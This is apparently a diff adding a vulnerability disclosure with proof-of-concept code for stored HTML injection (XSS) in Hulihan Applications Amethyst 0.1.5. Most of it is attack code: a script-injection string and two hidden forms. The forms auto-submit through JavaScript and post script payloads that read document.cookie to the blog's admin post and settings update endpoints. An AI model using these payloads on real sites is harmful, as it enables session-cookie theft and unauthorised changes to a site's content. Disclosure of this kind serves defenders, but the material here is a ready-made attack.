@@ -1,0 +1,55 @@
+source: http://www.securityfocus.com/bid/42253/info
+
+Hulihan Applications Amethyst is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Hulihan Applications Amethyst 0.1.5 is vulnerable; prior versions may also be affected. 
+
+&#039;mynameis<script>alert(document.cookie)</script>
+
+<form action="http://www.example.com/admin/update/2" method="post" name="main" >
+
+<input type="hidden" name="post[title]" value=&#039;title"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="post[content]" value="this is my post" />
+<input type="hidden" name="post[created_at(1i)]" value="2010" />
+<input type="hidden" name="post[created_at(2i)]" value="7" />
+<input type="hidden" name="post[created_at(3i)]" value="15" />
+<input type="hidden" name="post[created_at(4i)]" value="20" />
+<input type="hidden" name="post[created_at(5i)]" value="39" />
+<input type="hidden" name="post[updated_at(1i)]" value="2010" />
+<input type="hidden" name="post[updated_at(2i)]" value="7" />
+<input type="hidden" name="post[updated_at(3i)]" value="15" />
+<input type="hidden" name="post[updated_at(4i)]" value="20" />
+<input type="hidden" name="post[updated_at(5i)]" value="39" />
+<input type="hidden" name="commit" value="Create" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://ww.example.com/admin/update_settings" method="post" name="main" >
+
+<input type="hidden" name="setting[site_title]" value=&#039;My blog"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="setting[site_description]" value="Welcome to My Amethyst Blog!" />
+<input type="hidden" name="setting[site_keywords]" value="amethyst blog, xss" />
+<input type="hidden" name="setting[enable_site_title]" value="1" />
+<input type="hidden" name="setting[posts_per_page]" value="10" />
+<input type="hidden" name="setting[archive_months_to_show]" value="12" />
+<input type="hidden" name="setting[enable_menu_archive]" value="1" />
+<input type="hidden" name="setting[enable_menu_search]" value="1" />
+<input type="hidden" name="setting[enable_menu_tools]" value="0" />
+<input type="hidden" name="setting[enable_menu_other]" value="1" />
+<input type="hidden" name="setting[item_thumbnail_width]" value="100" />
+<input type="hidden" name="setting[item_thumbnail_height]" value="100" />
+<input type="hidden" name="setting[resize_item_images]" value="0" />
+<input type="hidden" name="setting[item_image_width]" value="500" />
+<input type="hidden" name="setting[item_image_height]" value="500" />
+<input type="hidden" name="commit" value="Update Settings" />
+
+</form>
+<script>
+document.main.submit();
+</script>
